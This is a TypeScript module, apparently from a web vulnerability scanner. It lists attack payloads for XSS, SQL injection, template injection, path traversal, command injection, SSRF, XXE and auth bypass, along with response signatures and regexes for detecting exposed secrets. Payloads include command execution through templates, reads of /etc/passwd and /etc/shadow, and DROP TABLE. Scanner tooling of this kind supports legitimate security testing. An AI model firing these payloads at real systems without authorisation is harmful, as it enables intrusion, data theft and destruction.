export interface PayloadSet {
  xss: string[];
  sqli: string[];
  ssti: string[];
  pathTraversal: string[];
  commandInjection: string[];
  ssrf: string[];
  openRedirect: string[];
  authBypass: string[];
  idor: string[];
  xxe: string[];
}

export const PAYLOADS: PayloadSet = {
  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "';alert('XSS')//",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "{{7*7}}",
    "${7*7}",
    "<details open ontoggle=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<math><a xlink:href='javascript:alert(1)'>click",
  ],

  sqli: [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT username,password,null FROM users--",
    "1; DROP TABLE users--",
    "' AND SLEEP(5)--",
    "' AND 1=CONVERT(int,@@version)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)#",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "admin'--",
    "' OR 'x'='x",
    "1 AND 1=1",
    "1 AND 1=2",
  ],

  ssti: [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "{{self.__class__.__mro__[2].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.mro()[1].__subclasses__()}}",
    "{% for c in [].__class__.__base__.__subclasses__() %}{{c.__name__}}{% endfor %}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "*{7*7}",
    "@{7*7}",
    "{{7*'7'}}",
  ],

  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\Windows\\system32\\drivers\\etc\\hosts",
    "../../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/proc/self/environ",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "../../../../../../../../etc/passwd%00",
  ],

  commandInjection: [
    "; id",
    "| id",
    "` id `",
    "$(id)",
    "; sleep 5",
    "| sleep 5",
    "` sleep 5 `",
    "&& id",
    "|| id",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "; whoami",
    "| whoami",
    "& whoami",
  ],

  ssrf: [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://metadata.google.internal",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_info",
  ],

  openRedirect: [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2f..",
    "/\\evil.com",
    "https://evil.com@target.com",
    "javascript:alert(1)",
    "/%0d%0aLocation: https://evil.com",
    "https://evil.com?",
    "https://evil.com#",
    "///evil.com",
    "////evil.com",
  ],

  authBypass: [
    "admin",
    "admin'--",
    "' OR '1'='1",
    "admin' OR '1'='1'--",
    "' OR 1=1--",
    "' OR ''='",
    "admin'/*",
    "anything",
    "admin' #",
    "' or 1=1 LIMIT 1;#",
    "admin'%00",
  ],

  idor: [
    "0",
    "1",
    "2",
    "100",
    "1000",
    "-1",
    "null",
    "undefined",
    "true",
    "false",
    "999999",
    "00000000-0000-0000-0000-000000000000",
    "../1",
  ],

  xxe: [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/test">]><foo>&xxe;</foo>`,
    `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`,
  ],
};

export const VULN_SIGNATURES: Record<string, RegExp[]> = {
  sqli: [
    /SQL syntax.*?MySQL/i,
    /Warning.*?\Wmysql_/i,
    /ORA-\d{5}/i,
    /PostgreSQL.*?ERROR/i,
    /SQLite.*?error/i,
    /Unclosed quotation mark/i,
    /Syntax error.*?in query expression/i,
    /SQLSTATE/i,
    /You have an error in your SQL syntax/i,
  ],
  xss: [
    /<script>alert\(['"]XSS['"]\)<\/script>/i,
    /onerror=alert\(['"]XSS['"]\)/i,
    /onload=alert\(['"]XSS['"]\)/i,
  ],
  ssti: [/49/, /Error executing template/i, /Jinja2.*?error/i],
  pathTraversal: [
    /root:.*?:0:0:/,
    /\[boot loader\]/i,
    /daemon:.*?:1:1:/,
  ],
  commandInjection: [
    /uid=\d+\(.*?\)/,
    /root@/,
    /sh:\s+\d+:/,
  ],
  ssrf: [
    /ami-id/i,
    /instance-id/i,
    /local-ipv4/i,
    /computeMetadata/i,
  ],
};

export const SENSITIVE_DATA_PATTERNS: Record<string, RegExp> = {
  "AWS Access Key": /AKIA[0-9A-Z]{16}/,
  "AWS Secret Key": /aws_secret_access_key.*?=.*?[A-Za-z0-9+/]{40}/i,
  "API Key Generic": /api[_-]?key.*?['":\s]+[a-zA-Z0-9_\-]{20,}/i,
  "Private Key": /-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----/,
  "JWT Token": /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/,
  "Google API": /AIza[0-9A-Za-z\-_]{35}/,
  "Stripe Key": /sk_live_[0-9a-zA-Z]{24}/,
  "Password in URL": /[?&](?:password|passwd|pwd)=[^&]+/i,
  "Email": /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/,
  "IP Internal": /\b(10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)\b/,
  "Stack Trace": /at\s+\w+\.\w+\s*\(\w+\.java:\d+\)|at\s+\w+\s+\(.*?:\d+:\d+\)/,
  "MongoDB URI": /mongodb(?:\+srv)?:\/\/[^"'\s]+/i,
  "S3 Bucket": /s3\.amazonaws\.com\/[a-z0-9.-]+/i,
};
